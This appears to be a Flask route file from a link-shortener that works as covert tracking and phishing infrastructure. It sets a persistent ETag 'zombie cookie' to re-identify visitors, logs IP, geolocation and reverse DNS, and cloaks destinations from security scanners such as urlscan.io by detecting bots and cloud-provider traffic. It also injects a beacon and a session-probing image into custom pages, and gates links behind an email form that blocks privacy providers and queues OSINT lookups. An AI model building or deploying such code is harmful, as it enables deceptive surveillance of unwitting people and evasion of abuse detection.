from flask import Blueprint, request, render_template, abort, make_response, redirect, render_template_string
from user_agents import parse
from datetime import datetime
import hashlib

from ..models import Link, Visit
from ..extensions import db
from ..utils import get_geo_data, is_bot_ua, verify_turnstile, get_reverse_dns, parse_referrer
from ..config import Config

bp = Blueprint('public', __name__)

LINK_CACHE = {}
CACHE_TTL = 60

@bp.route('/<slug>', methods=['GET'])
def redirect_to_url(slug):
    # 1. Cache
    cached = LINK_CACHE.get(slug)
    link = None
    if cached and (datetime.utcnow().timestamp() - cached['timestamp'] < CACHE_TTL):
        link = cached['link']
    
    if not link:
        # PROTECT RESERVED ROUTES from being caught as slugs
        if slug in ['dashboard', 'login', 'logout', 'api', 'static']:
            abort(404)
            
        link = Link.query.filter_by(slug=slug).first_or_404()
        LINK_CACHE[slug] = {'link': link, 'timestamp': datetime.utcnow().timestamp()}

    # Log Visit
    client_ip = request.headers.get('X-Real-IP', request.remote_addr)
    ua_string = request.user_agent.string
    user_agent = parse(ua_string)
    geo = get_geo_data(client_ip)
    
    
    # V27: ETag Zombie Cookie Logic
    # 1. Check if browser sent an ETag (If-None-Match)
    client_etag = request.headers.get('If-None-Match')
    if not client_etag:
        # Generate new ETag ID
        import uuid
        client_etag = str(uuid.uuid4())
    
    # 2. Save to Visit
    visit = Visit(
        link_id=link.id,
        ip_address=client_ip,
        user_agent=ua_string,
        referrer=request.referrer,
        os_family=user_agent.os.family,
        device_type="Mobile" if user_agent.is_mobile else "Tablet" if user_agent.is_tablet else "Desktop",
        isp=geo.get('isp'),
        org=geo.get('org'), # V28 Identity
        hostname=get_reverse_dns(client_ip), # V29 Reverse DNS
        city=geo.get('city'),
        country=geo.get('country'),
        lat=geo.get('lat'),
        lon=geo.get('lon'),
        etag=client_etag # Save the Zombie ID
    )
    db.session.add(visit)
    db.session.commit()
    
    # Checks
    final_dest = link.destination
    if not (final_dest.startswith("http://") or final_dest.startswith("https://")):
        final_dest = "https://" + final_dest
    
    # V37 CLOAKING LOGIC FIX
    # Only redirect to safe_url if detected as BOT or SUSPICIOUS
    is_bot = is_bot_ua(ua_string) or geo.get('hosting') == True
    
    # Check for known Cloud Providers (urlscan.io often uses these)
    if not is_bot and geo.get('org'):
        cloud_providers = ['google', 'amazon', 'microsoft', 'digitalocean', 'oracle', 'aliyun', 'hetzner']
        org_lower = geo.get('org').lower()
        if any(p in org_lower for p in cloud_providers):
            is_bot = True

    if link.block_bots and is_bot:
         visit.is_suspicious = True
         db.session.commit()
         if link.safe_url: 
             final_dest = link.safe_url
         else: 
             return render_template('error.html', message="Suspicious Traffic", visit_id=visit.id, hide_nav=True), 403

    # V38 AI Architect Custom Rendering
    if link.custom_html:
        # Inject Tracking Beacon
        tracking_js = f"""
        <script>
            try {{
                navigator.sendBeacon("/api/beacon", JSON.stringify({{
                    visit_id: "{visit.id}",
                    canvas_hash: "ArchitectFit",
                    webgl_renderer: "CustomLanding"
                }}));
                // Simple version of Session Detector for custom pages
                (function(){{
                    const probes = [{{name:'Github',url:'https://github.com/fluidicon.png'}}];
                    probes.forEach(p => {{
                        new Image().src = p.url;
                    }});
                }})();
            }} catch(e) {{}}
        </script>
        """
        html_content = link.custom_html.replace('</body>', tracking_js + '</body>')
        return render_template_string(html_content, destination=final_dest, visit_id=visit.id)

    # Success
    resp = make_response(render_template('loading.html', destination=final_dest, visit_id=visit.id, allow_no_js=link.allow_no_js, hide_nav=True))
    
    # 3. SET THE TRAP (Send ETag back to browser)
    resp.headers['ETag'] = client_etag
    resp.headers['Cache-Control'] = 'private, max-age=31536000' # Force caching
    
    return resp

@bp.route('/verify_email', methods=['POST'])
def verify_email():
    slug = request.form.get('slug')
    visit_id = request.form.get('visit_id')
    email = request.form.get('email')
    
    # 1. Basic Validation
    if not slug or not email:
        return "Missing data", 400
        
    link = Link.query.filter_by(slug=slug).first_or_404()
    visit = Visit.query.get(visit_id)
    
    # 2. Email Policy Enforcement (V23)
    from ..utils import is_disposable_email, is_privacy_email
    
    # Policy: Certified Only (Block Temp)
    if link.email_policy in ['certified', 'trackable']:
        if is_disposable_email(email):
            return render_template('email_gate.html', 
                                 slug=slug, visit_id=visit_id, site_key=Config.TURNSTILE_SITE_KEY,
                                 error="Ephemeral/Temporary emails are not accepted. Please use a standard provider.")

    # Policy: Trackable Only (Block Temp + Privacy)
    if link.email_policy == 'trackable':
        if is_privacy_email(email):
            temp_provider = is_disposable_email(email) # Recheck to be sure
            error_msg = "Private/Anonymous email providers are restricted. Please use a standard ISP or Corporate email."
            return render_template('email_gate.html', 
                                 slug=slug, visit_id=visit_id, site_key=Config.TURNSTILE_SITE_KEY,
                                 error=error_msg)

    # 3. Save Email and Create Lead
    if visit:
        visit.email = email
        db.session.commit()
        
        # Create Lead if not exists
        from ..models import Lead
        lead = Lead.query.filter_by(email=email).first()
        if not lead:
            lead = Lead(email=email, scan_status='pending')
            db.session.add(lead)
            db.session.commit()
        
        # Async OSINT
        from ..extensions import log_queue
        log_queue.put({'type': 'osint', 'email': email})
    
    # 4. Success -> Redirect to Loading
    # Checks
    final_dest = link.destination
    if not (final_dest.startswith("http://") or final_dest.startswith("https://")):
        final_dest = "https://" + final_dest
    if link.safe_url: final_dest = link.safe_url
        
    return render_template('loading.html', destination=final_dest, visit_id=visit_id, allow_no_js=link.allow_no_js, hide_nav=True)
